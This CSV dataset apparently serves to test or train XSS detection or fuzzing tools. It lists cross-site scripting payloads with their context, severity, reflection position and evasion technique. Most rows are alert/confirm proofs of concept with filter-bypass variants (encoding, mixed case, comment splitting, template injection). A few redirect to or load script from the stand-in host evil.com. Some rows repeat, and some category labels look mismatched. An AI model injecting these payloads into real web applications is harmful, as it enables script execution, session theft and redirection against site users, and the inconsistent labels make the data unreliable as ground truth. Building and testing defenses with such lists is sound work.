payload,payload_with_context,context,severity,source,sink,reflection_position,technique
<body onload=alert(1)>,<body onload=alert(1)> [position:html_body],tag_injection,medium,,,html_body,mutated
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute,medium,,,attribute,mutated
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute,medium,,,attribute,mutated
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:html_body]",attribute_escape,medium,,,html_body,obfuscated:comment_inject
&lt;details open ontoggle=alert(1)&gt;,&lt;details open ontoggle=alert(1)&gt; [position:none],event_handler,high,,,none,obfuscated:html_entity
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",tag_injection,medium,,,script,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",attribute_escape,low,,,script,original
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:html_body],script_injection,high,,,html_body,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],js_uri,high,,,script,original
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:script],event_handler,high,,,script,mutated
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:none],event_handler,high,,,none,original
"onerror=""window.alert(1)""","onerror=""window.alert(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:html_body]",event_handler,high,,,html_body,mutated
<scr/**/ipt>prompt(1)</scr/**/ipt>,<scr/**/ipt>prompt(1)</scr/**/ipt> [position:html_body],script_injection,low,,,html_body,obfuscated:comment_inject
oNloaD='alERT(1)',oNloaD='alERT(1)' [position:html_body],attribute,medium,,,html_body,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,high,,,attribute,original
' ><img src=x onerror=alert(1)>,' ><img src=x onerror=alert(1)> [position:attribute],attribute,medium,,,attribute,original
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,medium,,,script,original
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:style]",attribute_escape,low,,,style,mutated
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:script]",js_uri,medium,,,script,mutated
<SCRIPT>alert(1)</SCRIPT>,<SCRIPT>alert(1)</SCRIPT> [position:html_body],script_injection,medium,,,html_body,original
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,low,,,attribute,mutated
"document.write(""<img src=x onerror=alert(1)>"")","document.write(""<img src=x onerror=alert(1)>"") [position:none]",dom_sink,medium,,,none,original
"<details open ontoggle
=alert(	1)>","<details open ontoggle
=alert(	1)> [position:script]",event_handler,medium,,,script,obfuscated:tab_newline_inject
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:none]",template_injection,low,,,none,original
"{{constructor.constructor(""confirm(1)"")()}}","{{constructor.constructor(""confirm(1)"")()}} [position:script]",template_injection,medium,,,script,mutated
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,low,,,script,mutated
javascript:alert(document.domain),javascript:alert(document.domain) [position:attribute],js_uri,high,,,attribute,original
<script>prompt(1)</script>,<script>prompt(1)</script> [position:script],script_injection,high,,,script,original
"#""><svg onload=alert(1)>","#""><svg onload=alert(1)> [position:comment]",attribute,medium,,,comment,none
{{7*7}},{{7*7}} [position:style],template_injection,low,,,style,obfuscated:concat_split
"\x3cembed src=""javascript:alert(1)""\x3e","\x3cembed src=""javascript:alert(1)""\x3e [position:html_body]",tag_injection,medium,,,html_body,obfuscated:hex_escape
"""><Svg oNLoaD=alErT(1)>","""><Svg oNLoaD=alErT(1)> [position:dom]",html_body,medium,,,dom,mutated
"sEtTiMeOuT(""aLeRt(1)"",0)","sEtTiMeOuT(""aLeRt(1)"",0) [position:script]",dom_sink,medium,,,script,obfuscated:mixed_case
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:script]",dom_sink,high,,,script,original
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:style],attribute_escape,high,,,style,mutated
${alert(1)},${alert(1)} [position:style],template_injection,high,,,style,mutated
javascript:confirm(1),javascript:confirm(1) [position:style],js_uri,medium,,,style,obfuscated:concat_split
"{{constructor.constructor(""al'+'ert(1)"")()}}","{{constructor.constructor(""al'+'ert(1)"")()}} [position:script]",template_injection,medium,,,script,obfuscated:concat_split
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:none]",event_handler,low,,,none,original
"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;","data:text/html,&lt;script&gt;alert(1)&lt;/script&gt; [position:html_body]",script_injection,medium,,,html_body,obfuscated:html_entity
"{{constructor.constructor(""\u0061\u006cert(1)"")()}}","{{constructor.constructor(""\u0061\u006cert(1)"")()}} [position:script]",tag_injection,low,,,script,obfuscated:unicode_escape
""" onfocus
=alert(	1) autofocus
=""",""" onfocus
=alert(	1) autofocus
="" [position:style]",event_handler,low,,,style,obfuscated:tab_newline_inject
"<embed src=""javascr/**/ipt:alert(1)"">","<embed src=""javascr/**/ipt:alert(1)""> [position:script]",tag_injection,low,,,script,obfuscated:comment_inject
<svg onload=alert(1)>,<svg onload=alert(1)> [position:style],event_handler,low,,,style,original
#{alert(1)},#{alert(1)} [position:script],attribute_escape,medium,,,script,original
"<details open ontoggle
=alert(	1)>","<details open ontoggle
=alert(	1)> [position:attribute]",event_handler,low,,,attribute,obfuscated:tab_newline_inject
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:html_body],event_handler,low,,,html_body,original
\x3csvg onload=alert(1)\x3e,\x3csvg onload=alert(1)\x3e [position:html_body],event_handler,medium,,,html_body,obfuscated:hex_escape
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:style],template_injection,low,,,style,original
onload='alert(1)',onload='alert(1)' [position:html_body],attribute,medium,,,html_body,none
javascript:alert(1),javascript:alert(1) [position:attribute],js_uri,medium,,,attribute,mutated
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:style]",template_injection,medium,,,style,obfuscated:html_entity
"""><ImG SrC=X OnErRoR=AlErT(1)>","""><ImG SrC=X OnErRoR=AlErT(1)> [position:script]",tag_injection,high,,,script,obfuscated:mixed_case
\' onerror=alert(1)//,\' onerror=alert(1)// [position:html_body],attribute_escape,high,,,html_body,original
"<iframe src=""javaSCRIPT:alert(1)"">","<iframe src=""javaSCRIPT:alert(1)""> [position:html_body]",event_handler,low,,,html_body,mutated
#{alert(1)},#{alert(1)} [position:attribute],attribute,low,,,attribute,original
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,original
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,low,,,script,obfuscated:comment_inject
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,high,,,html_body,mutated
"<embed src=""javaSCRIPT:alert(1)"">","<embed src=""javaSCRIPT:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,mutated
"%3Ciframe src=""javascript:alert(1)""%3E","%3Ciframe src=""javascript:alert(1)""%3E [position:html_body]",event_handler,low,,,html_body,obfuscated:url_encode
"OneRrOR=""aLert(1)""","OneRrOR=""aLert(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:attribute]",event_handler,medium,,,attribute,original
#{alert(1)},#{alert(1)} [position:html_body],template_injection,high,,,html_body,original
<body onload=alert(1)>,<body onload=alert(1)> [position:attribute],event_handler,high,,,attribute,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:html_body],script_injection,medium,,,html_body,original
"data:text/html,%3Cscript%3Ealert(1)%3C/script%3E","data:text/html,%3Cscript%3Ealert(1)%3C/script%3E [position:attribute]",js_uri,low,,,attribute,obfuscated:url_encode
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:none]",template_injection,medium,,,none,original
<svg>d.innerHTML+='';</script>,<svg>d.innerHTML+='';</script> [position:html_body],html_body,high,,,html_body,mutated
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],tag_injection,medium,,,script,original
javascript:confirm(1),javascript:confirm(1) [position:html_body],js_uri,medium,,,html_body,obfuscated:hex_escape
${alert(1)},${alert(1)} [position:attribute],template_injection,medium,,,attribute,mutated
' ><img src=x onerror=\u0061\u006cert(1)>,' ><img src=x onerror=\u0061\u006cert(1)> [position:none],js_uri,medium,,,none,obfuscated:unicode_escape
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",script_injection,high,,,script,original
#{alert(1)},#{alert(1)} [position:html_body],template_injection,high,,,html_body,original
"document.body.innerHTML=""<img src=x onerror=alert(1)>""","document.body.innerHTML=""<img src=x onerror=alert(1)>"" [position:script]",template_injection,low,,,script,mutated
"\"" onerror=confirm(1)//","\"" onerror=confirm(1)// [position:none]",attribute_escape,high,,,none,mutated
javaSCRIPT:confirm(1),javaSCRIPT:confirm(1) [position:none],js_uri,low,,,none,mutated
"onerror=""alert(1)""","onerror=""alert(1)"" [position:html_body]",html_body,medium,,,html_body,none
onerror='alert(1)',onerror='alert(1)' [position:html_body],html_body,medium,,,html_body,none
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:attribute]",js_uri,low,,,attribute,original
<%= al'+'ert(1) %>,<%= al'+'ert(1) %> [position:html_body],template_injection,medium,,,html_body,obfuscated:concat_split
%3Cmarquee onstart=alert(1)%3E,%3Cmarquee onstart=alert(1)%3E [position:html_body],event_handler,low,,,html_body,obfuscated:url_encode
<iframe/onload=alert(0);>,<iframe/onload=alert(0);> [position:html_body],html_body,medium,,,html_body,none
%3Csvg/onload=alert(1)%3E,%3Csvg/onload=alert(1)%3E [position:html_body],tag_injection,low,,,html_body,obfuscated:url_encode
<scr/**/ipt>confirm(1)</scr/**/ipt>,<scr/**/ipt>confirm(1)</scr/**/ipt> [position:html_body],script_injection,high,,,html_body,obfuscated:comment_inject
"""><iframe onload=alert(1);>","""><iframe onload=alert(1);> [position:dom]",html_body,medium,,,dom,none
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],dom_sink,low,,,script,obfuscated:comment_inject
%3Cscript%3Econfirm(1)%3C/script%3E,%3Cscript%3Econfirm(1)%3C/script%3E [position:script],script_injection,medium,,,script,obfuscated:url_encode
<svg onload=alert(1)>,<svg onload=alert(1)> [position:style],event_handler,high,,,style,original
<DeTaIlS OpEn oNtOgGlE=AlErT(1)>,<DeTaIlS OpEn oNtOgGlE=AlErT(1)> [position:html_body],event_handler,low,,,html_body,obfuscated:mixed_case
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:style],event_handler,low,,,style,mutated
<svg Onload=aleRT()>,<svg Onload=aleRT()> [position:html_body],html_body,medium,,,html_body,mutated
<img/src=x onerror=alert(1)//>,<img/src=x onerror=alert(1)//> [position:html_body],event_handler,low,,,html_body,mutated
"\x3cembed src=""javascript:alert(1)""\x3e","\x3cembed src=""javascript:alert(1)""\x3e [position:none]",event_handler,medium,,,none,obfuscated:hex_escape
{{7*7}},{{7*7}} [position:script],template_injection,medium,,,script,obfuscated:url_encode
-alErT(23)/,-alErT(23)/ [position:attribute],attribute,medium,,,attribute,mutated
javascript:alert(document.domain),javascript:alert(document.domain) [position:html_body],js_uri,low,,,html_body,original
<script>d.innerHTML+='';</script>,<script>d.innerHTML+='';</script> [position:html_body],html_body,high,,,html_body,none
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],dom_sink,medium,,,script,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,low,,,script,original
< script>d.innerHTML+='';</script>,< script>d.innerHTML+='';</script> [position:html_body],html_body,high,,,html_body,mutated
\x3cscript\x3econfirm(1)\x3c/script\x3e,\x3cscript\x3econfirm(1)\x3c/script\x3e [position:script],script_injection,low,,,script,obfuscated:hex_escape
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,medium,,,script,original
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:script]",tag_injection,high,,,script,original
"document.body.innerHTML=""<img src=x onerror=alert(1)>""","document.body.innerHTML=""<img src=x onerror=alert(1)>"" [position:none]",dom_sink,medium,,,none,original
"document.body.innerHTML=""<img src=x onerror=alert(1)>""","document.body.innerHTML=""<img src=x onerror=alert(1)>"" [position:none]",dom_sink,low,,,none,original
<body on\u006co\u0061d=\u0061\u006cert(1)>,<body on\u006co\u0061d=\u0061\u006cert(1)> [position:attribute],attribute,high,,,attribute,obfuscated:unicode_escape
<body onload=alert(1)>,<body onload=alert(1)> [position:attribute],event_handler,medium,,,attribute,original
#{alert(1)},#{alert(1)} [position:style],template_injection,low,,,style,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:attribute],attribute_escape,low,,,attribute,original
\x3cimg src=x onerror=alert(1)\x3e,\x3cimg src=x onerror=alert(1)\x3e [position:script],tag_injection,medium,,,script,obfuscated:hex_escape
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:script]",event_handler,medium,,,script,obfuscated:hex_escape
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",dom_sink,high,,,script,obfuscated:url_encode
"<img/src
=x onerror
=alert(	1)//>","<img/src
=x onerror
=alert(	1)//> [position:none]",event_handler,high,,,none,obfuscated:tab_newline_inject
"""><img src=x onerror=al'+'ert(1)>","""><img src=x onerror=al'+'ert(1)> [position:attribute]",attribute,medium,,,attribute,obfuscated:concat_split
javascript:alert(1),javascript:alert(1) [position:html_body],event_handler,medium,,,html_body,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,high,,,attribute,obfuscated:html_entity
